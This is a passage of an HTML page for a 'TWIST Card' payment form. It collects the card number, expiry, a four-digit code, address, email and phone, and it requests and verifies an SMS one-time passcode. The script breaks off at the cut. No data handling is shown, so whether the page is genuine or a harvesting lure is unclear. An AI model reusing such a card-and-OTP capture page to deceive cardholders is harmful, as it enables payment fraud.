<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>TWIST Card Payment</title>
<style>
  :root { --brand:#f97316; --bg:#f3f4f6; --muted:#6b7280; --ok:#16a34a; --bad:#dc2626; }
  body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; background: var(--bg); padding: 1.5rem; }
  .form-wrapper { max-width: 540px; margin: auto; }
  .form-container { background: #fff; padding: 1.5rem; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,.06); position: relative; }
  .form-group { margin-bottom: 1rem; }
  label { font-weight: 600; display: block; margin-bottom: 0.35rem; }
  input { width: 100%; padding: .65rem .7rem; font-size: 1rem; border-radius: 8px; border: 1px solid #cfcfcf; outline: none; }
  input:focus { border-color: var(--brand); box-shadow: 0 0 0 3px rgba(249,115,22,.15); }
  .row { display: grid; grid-template-columns: 1fr 1fr; gap: .75rem; }
  button { background: var(--brand); color: #fff; border: 0; padding: .8rem 1.1rem; border-radius: 8px; cursor: pointer; font-weight: 700; }
  button[disabled] { opacity: .6; cursor: not-allowed; }
  .muted { color: var(--muted); font-size: .92rem; }
  .notice { background: #fff3cd; color: #856404; border: 1px solid #ffeeba; padding: .9rem; border-radius: 8px; margin-bottom: 1rem; }
  .hidden { display: none; }
  .spinner { width: 40px; height: 40px; border: 4px solid #ccc; border-top: 4px solid var(--brand); border-radius: 50%; animation: spin 1s linear infinite; margin: 1rem auto; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .ok { color: var(--ok); font-weight: 700; }
  .bad { color: var(--bad); font-weight: 700; }
  .btn-inline { display:flex; gap:.5rem; }
  .err { color: var(--bad); margin-top:.4rem; font-size:.9rem; }
</style>
</head>
<body>
<div class="form-wrapper">
  <h2>Pay for your order with your TWIST CARD</h2>
  <p id="orderDetails" class="muted"></p>

  <div class="form-container" role="region" aria-label="Twist Card payment form">
    <div style="text-align:center; margin-bottom:1rem;">
      <img style="max-width:160px" alt="Twist Card"
           src="https://cdn.shopify.com/s/files/1/0745/9635/2225/files/Twist_500ppx.jpg?v=1748980607">
    </div>

    <div class="notice hidden" id="autoFillNotice">
      <strong>These fields should be auto filled.</strong><br>
      To pay with your card, click on the link provided in your order confirmation.
    </div>

    <form id="paymentForm" autocomplete="off" novalidate>
      <fieldset style="background:#eef3f7; padding:1rem; border:none; border-radius:10px; margin-bottom:1rem;">
        <div class="form-group">
          <label for="orderno">Order Number</label>
          <input type="text" id="orderno" readonly aria-readonly="true">
        </div>
        <div class="form-group">
          <label for="amount">Amount</label>
          <input type="text" id="amount" readonly aria-readonly="true">
        </div>
      </fieldset>

      <div class="form-group">
        <label for="cardNumber">Card Number</label>
        <input type="text" id="cardNumber" maxlength="17" inputmode="numeric" required>
        <!-- no 16-digit/prefix hint -->
      </div>

      <div class="row">
        <div class="form-group">
          <label for="expiration">Expiration (MMYY)</label>
          <input type="text" id="expiration" placeholder="MMYY" inputmode="numeric" required>
        </div>
        <div class="form-group">
          <label for="twist">TWIST Code (XXXX)</label>
          <input type="text" id="twist" maxlength="4" inputmode="numeric" required>
        </div>
      </div>

      <!-- First/Last Name removed per request -->

      <div class="form-group">
        <label for="address">Address</label>
        <input type="text" id="address" autocomplete="address-line1">
      </div>

      <div class="row">
        <div class="form-group">
          <label for="city">City</label>
          <input type="text" id="city" autocomplete="address-level2">
        </div>
        <div class="form-group">
          <label for="postal">Postal Code</label>
          <input type="text" id="postal" autocomplete="postal-code" required>
        </div>
      </div>

      <div class="form-group">
        <label for="name">Cardholder Name</label>
        <input type="text" id="name" required autocomplete="cc-name">
      </div>

      <div class="form-group">
        <label for="email">Email (must match your account)</label>
        <input type="email" id="email" required autocomplete="email">
      </div>

      <div class="form-group">
        <label for="otpPhone">Phone (+1XXXXXXXXXX)</label>
        <div class="btn-inline">
          <input type="text" id="otpPhone" required autocomplete="tel" placeholder="+1##########">
          <button type="button" id="sendOtpBtn">Send OTP</button>
        </div>
        <div id="sendOtpNote" class="muted"></div>
      </div>

      <div class="form-group">
        <label for="otpCode">Enter OTP</label>
        <div class="btn-inline">
          <input type="text" id="otpCode" required inputmode="numeric" placeholder="6-digit code">
          <button type="button" id="verifyOtpBtn">Verify OTP</button>
        </div>
        <div id="otpStatus" class="muted" style="margin-top:.5rem; font-weight:700;"></div>
      </div>

      <button type="submit" id="submitBtn" disabled>Submit Payment</button>
      <div id="loadingSpinner" class="hidden" style="text-align:center; margin-top: 1rem;">
        <div class="spinner" aria-hidden="true"></div>
        <p>Processing your payment...</p>
      </div>

      <div id="clientErr" class="err hidden"></div>
    </form>

    <div id="confirmationStep" class="hidden" style="text-align:center;">
      <h3>STEP 2 — We are validating your information.</h3>
      <div class="spinner" aria-hidden="true"></div>
      <p>Please wait a moment for confirmation.</p>
    </div>

    <div id="confirmationSuccess" class="hidden" style="text-align:center;">
      <h2 class="ok">✅ Transaction Approved</h2>
      <p>Thank you! Your payment was successfully processed.</p>
    </div>

    <div id="confirmationDenied" class="hidden" style="text-align:center;">
      <h2 class="bad">❌ Transaction Denied</h2>
      <p>Please contact Twist Card customer service.</p>
    </div>
  </div>
</div>

<script>
  /* ------------ URL params ------------ */
  const qp = new URLSearchParams(window.location.search);
  const amountQP = qp.get('amount') || '';
  const ordernoQP = qp.get('orderno') || '';
  const emailQP  = qp.get('email') || '';
  document.getElementById('amount').
